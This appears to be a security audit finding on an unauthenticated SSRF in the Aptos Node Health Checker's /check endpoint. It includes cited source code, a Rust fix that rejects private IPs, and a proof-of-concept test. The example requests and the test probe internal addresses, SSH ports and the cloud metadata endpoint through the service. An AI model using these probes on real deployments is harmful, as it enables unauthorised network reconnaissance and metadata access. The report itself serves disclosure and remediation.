# Audit Report

## Title
Server-Side Request Forgery (SSRF) in Node Health Checker API Enables Network Port Scanning

## Summary
The Aptos Node Health Checker (NHC) service exposes an unauthenticated `/check` API endpoint that accepts arbitrary target URLs and ports without validation. This allows attackers to use the node-checker as a proxy to perform port scanning and service fingerprinting against internal and external networks, bypassing firewall restrictions and gathering intelligence about validator infrastructure.

## Finding Description

The node-checker service provides a `/check` endpoint that is designed to validate the health of Aptos nodes. However, this endpoint accepts user-controlled `node_url`, `api_port`, `metrics_port`, and `noise_port` parameters without any security validation. [1](#0-0) 

The endpoint directly creates a `NodeAddress` from these user-provided parameters and passes them to the runner, which attempts to establish connections to the specified address and ports. [2](#0-1) 

**Attack Flow:**

1. **No Authentication**: The API endpoint has no authentication mechanism, allowing any network client to make requests. [3](#0-2) 

2. **No URL Validation**: The system accepts any URL without checking if it points to private IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) or localhost.

3. **Connection Attempts**: The `SyncRunner` attempts to build providers that connect to the target address on multiple ports (metrics, API, noise). [4](#0-3) 

4. **Information Disclosure**: The system returns detailed `CheckResult` objects containing error messages, success indicators, and timing information that reveal whether ports are open and what services are running. [5](#0-4) 

**Exploitation Example:**

An attacker can send requests like:
- `GET /check?baseline_configuration_id=devnet_fullnode&node_url=http://10.0.0.5&api_port=22`
- `GET /check?baseline_configuration_id=devnet_fullnode&node_url=http://192.168.1.100&metrics_port=3306`
- `GET /check?baseline_configuration_id=devnet_fullnode&node_url=http://internal-validator.local&noise_port=6180`

The node-checker will attempt to connect to these addresses and return responses indicating:
- Connection success/failure
- Timeout vs connection refused (revealing port state)
- Error messages revealing service types
- Response timing indicating network latency

## Impact Explanation

This vulnerability enables **Server-Side Request Forgery (SSRF)** attacks with the following impacts:

1. **Internal Network Reconnaissance**: Attackers can map the internal network topology of validator infrastructure, identifying running services and open ports that are not externally accessible.

2. **Firewall Bypass**: The node-checker can be used as a proxy to access internal services that are protected by firewall rules, since the checker itself may have broader network access.

3. **Service Fingerprinting**: Detailed error messages and response patterns allow attackers to identify specific services (databases, admin panels, etc.) running on target hosts.

4. **Attack Surface Expansion**: Information gathered through port scanning can inform more sophisticated attacks against validator infrastructure.

This qualifies as **Medium Severity** per the Aptos bug bounty program because:
- It enables significant information disclosure about critical infrastructure
- It could facilitate more serious attacks against validator nodes
- It affects node security and operational infrastructure
- While it doesn't directly compromise consensus or funds, it weakens the overall security posture

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **No Prerequisites**: Attackers need only network access to the node-checker API endpoint, with no authentication or credentials required.

2. **Easy to Exploit**: Exploitation requires simple HTTP GET requests with no special tools or knowledge beyond basic web APIs.

3. **Publicly Exposed**: Node-checker services deployed for community use are intentionally internet-accessible, making them discoverable and reachable by attackers. [6](#0-5) 

4. **Immediate Feedback**: The API returns detailed responses immediately, making port scanning efficient and providing clear indicators of success.

5. **No Rate Limiting**: There are no apparent rate limits or request throttling mechanisms to prevent rapid scanning of large IP ranges.

## Recommendation

Implement the following security controls:

1. **Add Authentication**: Require API keys or OAuth tokens for all `/check` endpoint requests.

2. **Implement URL Allowlisting**: Validate that target URLs belong to an approved list of domains or IP ranges. Reject requests to:
   - Private IP ranges (RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Localhost/loopback (127.0.0.0/8, ::1)
   - Link-local addresses (169.254.0.0/16)
   - Other reserved ranges

3. **Add Rate Limiting**: Implement per-IP rate limiting to prevent abuse.

4. **Sanitize Error Messages**: Avoid returning detailed error messages that reveal service information. Return generic success/failure indicators.

**Example Implementation:**

```rust
// Add to server/api.rs
use std::net::IpAddr;

fn validate_target_url(url: &Url) -> Result<(), poem::Error> {
    // Resolve URL to IP address
    let host = url.host_str().ok_or_else(|| {
        poem::Error::from((StatusCode::BAD_REQUEST, anyhow!("Invalid URL")))
    })?;
    
    let socket_addrs = (host, 0).to_socket_addrs()
        .map_err(|e| poem::Error::from((StatusCode::BAD_REQUEST, anyhow!("Cannot resolve host: {}", e))))?;
    
    for socket_addr in socket_addrs {
        let ip = socket_addr.ip();
        
        // Reject private IPs
        if is_private_ip(&ip) {
            return Err(poem::Error::from((
                StatusCode::FORBIDDEN,
                anyhow!("Target URL points to private IP address")
            )));
        }
    }
    
    Ok(())
}

fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_private() || ipv4.is_loopback() || ipv4.is_link_local()
        }
        IpAddr::V6(ipv6) => {
            ipv6.is_loopback() || ipv6.is_unique_local()
        }
    }
}

// Call validation in check() endpoint before line 81
validate_target_url(&node_url.0)?;
```

## Proof of Concept

```rust
// Integration test demonstrating the SSRF vulnerability
// Place in ecosystem/node-checker/tests/ssrf_test.rs

use reqwest;
use serde_json::Value;

#[tokio::test]
async fn test_ssrf_port_scanning() {
    // Assumes node-checker server is running on localhost:20121
    // with a baseline configuration loaded (e.g., devnet_fullnode)
    
    let client = reqwest::Client::new();
    let base_url = "http://localhost:20121/check";
    
    // Test 1: Scan localhost port 22 (SSH)
    let response = client
        .get(base_url)
        .query(&[
            ("baseline_configuration_id", "devnet_fullnode"),
            ("node_url", "http://127.0.0.1"),
            ("api_port", "22"),
        ])
        .send()
        .await
        .expect("Failed to send request");
    
    let status = response.status();
    let body: Value = response.json().await.expect("Failed to parse JSON");
    
    println!("Response for localhost:22:");
    println!("Status: {}", status);
    println!("Body: {:#}", body);
    
    // Test 2: Scan internal network IP
    let response = client
        .get(base_url)
        .query(&[
            ("baseline_configuration_id", "devnet_fullnode"),
            ("node_url", "http://192.168.1.1"),
            ("metrics_port", "80"),
        ])
        .send()
        .await
        .expect("Failed to send request");
    
    let body: Value = response.json().await.expect("Failed to parse JSON");
    
    println!("\nResponse for 192.168.1.1:80:");
    println!("Body: {:#}", body);
    
    // Test 3: Scan cloud metadata endpoint
    let response = client
        .get(base_url)
        .query(&[
            ("baseline_configuration_id", "devnet_fullnode"),
            ("node_url", "http://169.254.169.254"),
            ("api_port", "80"),
        ])
        .send()
        .await
        .expect("Failed to send request");
    
    let body: Value = response.json().await.expect("Failed to parse JSON");
    
    println!("\nResponse for cloud metadata endpoint:");
    println!("Body: {:#}", body);
    
    // Analyze responses to determine port states
    // Open ports typically return different error messages than closed ports
    // Connection timeouts vs connection refused reveal different states
}
```

**To reproduce:**

1. Start the node-checker server with a baseline configuration:
   ```bash
   cargo run -p aptos-node-checker -- server run \
       --baseline-config-paths ./baseline-config.yaml
   ```

2. Run the proof of concept test:
   ```bash
   cargo test -p aptos-node-checker --test ssrf_test
   ```

3. Observe that the node-checker attempts connections to arbitrary addresses specified in the query parameters, returning information that reveals port states and running services.

## Notes

While the `validate_configuration()` function itself only validates that checkers can be built from configuration files [7](#0-6) , the broader node-checker system has this SSRF vulnerability in its runtime API. The baseline configuration's `node_address` field is loaded from local files controlled by the operator [8](#0-7) , making that vector less concerning. However, the `/check` API endpoint accepts user-controlled addresses without validation, creating a significant security risk for any publicly-exposed node-checker instance.

### Citations

**File:** ecosystem/node-checker/src/server/api.rs (L29-44)
```rust
    #[oai(path = "/check", method = "get")]
    async fn check(
        &self,
        /// The ID of the baseline node configuration to use for the evaluation, e.g. devnet_fullnode
        baseline_configuration_id: Query<String>,
        /// The URL of the node to check, e.g. http://44.238.19.217 or http://fullnode.mysite.com
        node_url: Query<Url>,
        /// If given, we will assume the metrics service is available at the given port.
        metrics_port: Query<Option<u16>>,
        /// If given, we will assume the API is available at the given port.
        api_port: Query<Option<u16>>,
        /// If given, we will assume that clients can communicate with your node via noise at the given port.
        noise_port: Query<Option<u16>>,
        /// A public key for the node, e.g. 0x44fd1324c66371b4788af0b901c9eb8088781acb29e6b8b9c791d5d9838fbe1f.
        /// This is only necessary for certain checkers, e.g. HandshakeChecker.
        public_key: Query<Option<String>>,
```

**File:** ecosystem/node-checker/src/server/api.rs (L81-92)
```rust
        let target_node_address = NodeAddress::new(
            node_url.0,
            api_port.0,
            metrics_port.0,
            noise_port.0,
            public_key,
        );

        let complete_evaluation_result = baseline_configuration
            .runner
            .run(&target_node_address)
            .await;
```

**File:** ecosystem/node-checker/src/server/run.rs (L51-66)
```rust
    let cors = Cors::new().allow_methods(vec![Method::GET]);

    Server::new(TcpListener::bind((
        args.server_args.listen_address,
        args.server_args.listen_port,
    )))
    .run(
        Route::new()
            .nest(api_endpoint, api_service)
            .nest("/spec", ui)
            .at("/spec.json", spec_json)
            .at("/spec.yaml", spec_yaml)
            .with(cors),
    )
    .await
    .map_err(anyhow::Error::msg)
```

**File:** ecosystem/node-checker/src/runner/sync_runner.rs (L87-153)
```rust
    async fn run(&self, target_node_address: &NodeAddress) -> Result<CheckSummary> {
        let now = std::time::Instant::now();
        info!(
            target_node_url = target_node_address.url,
            event = "check_starting"
        );

        // Here we build a ProviderCollection and try to build every Provider
        // we can based on the request. We clone the ProviderCollection from
        // the runner itself to start with, since it might already have some
        // prebuilt Providers in it (for the baseline node). Cloning this
        // ProviderCollection the nice property that the Providers within are
        // wrapped in Arcs, so we're still using the same Provider instances
        // between requests, allowing us to do some smart memoization.
        let mut provider_collection = self.provider_collection.clone();

        // Build the MetricsProvider for the target node.
        if let Ok(metrics_client) = target_node_address.get_metrics_client(Duration::from_secs(4)) {
            let metrics_client = Arc::new(metrics_client);
            provider_collection.target_metrics_provider = Some(MetricsProvider::new(
                self.provider_configs.metrics.clone(),
                metrics_client.clone(),
                target_node_address.url.clone(),
                target_node_address.get_metrics_port().unwrap(),
            ));
            provider_collection.target_system_information_provider =
                Some(SystemInformationProvider::new(
                    self.provider_configs.system_information.clone(),
                    metrics_client,
                    target_node_address.url.clone(),
                    target_node_address.get_metrics_port().unwrap(),
                ));
        }

        // Build the ApiIndexProvider for the target node.
        if let Ok(api_client) = target_node_address.get_api_client(Duration::from_secs(4)) {
            let api_index_provider = Arc::new(ApiIndexProvider::new(
                self.provider_configs.api_index.clone(),
                api_client,
            ));
            provider_collection.target_api_index_provider = Some(api_index_provider.clone());

            // From here, since we have an API provider, we can try to make a noise provider.
            if let (Some(_), Some(_)) = (
                target_node_address.get_noise_port(),
                target_node_address.get_public_key(),
            ) {
                // If the noise port and public key were provided but we can't parse
                // them as a network address, just fail early.
                let noise_address = match target_node_address.as_noise_network_address() {
                    Ok(noise_address) => noise_address,
                    Err(err) => {
                        return Ok(CheckSummary::from(vec![CheckResult::new(
                            "RequestHandler".to_string(),
                            "Invalid public key".to_string(),
                            0,
                            format!("Failed to build noise address: {:#}", err),
                        )]));
                    },
                };
                provider_collection.target_noise_provider = Some(NoiseProvider::new(
                    self.provider_configs.noise.clone(),
                    noise_address,
                    api_index_provider,
                ));
            }
        }
```

**File:** ecosystem/node-checker/src/checker/types.rs (L7-23)
```rust
#[derive(Clone, Debug, Deserialize, Object, Serialize)]
pub struct CheckResult {
    /// Name of the Checker that created the result.
    pub checker_name: String,

    /// Headline of the result, e.g. "Healthy!" or "Metrics missing!".
    pub headline: String,

    /// Score out of 100.
    pub score: u8,

    /// Explanation of the result.
    pub explanation: String,

    /// Links that might help the user fix a potential problem.
    pub links: Vec<String>,
}
```

**File:** ecosystem/node-checker/src/server/common.rs (L12-15)
```rust
pub struct ServerArgs {
    /// What address to listen on, e.g. localhost or 0.0.0.0
    #[clap(long, default_value = "0.0.0.0")]
    pub listen_address: String,
```

**File:** ecosystem/node-checker/src/configuration/validate.rs (L24-27)
```rust
pub fn validate_configuration(node_configuration: &BaselineConfiguration) -> Result<()> {
    build_checkers(&node_configuration.checkers).context("Failed to build Checkers")?;
    Ok(())
}
```

**File:** ecosystem/node-checker/src/configuration/types.rs (L8-15)
```rust
/// This defines a single baseline configuration.
#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct BaselineConfiguration {
    /// The address of the baseline node to use for this configuration. This is
    /// only necessary if this baseline configuration uses a Checker that
    /// requires information from a baseline node to operate.
    pub node_address: Option<NodeAddress>,
```
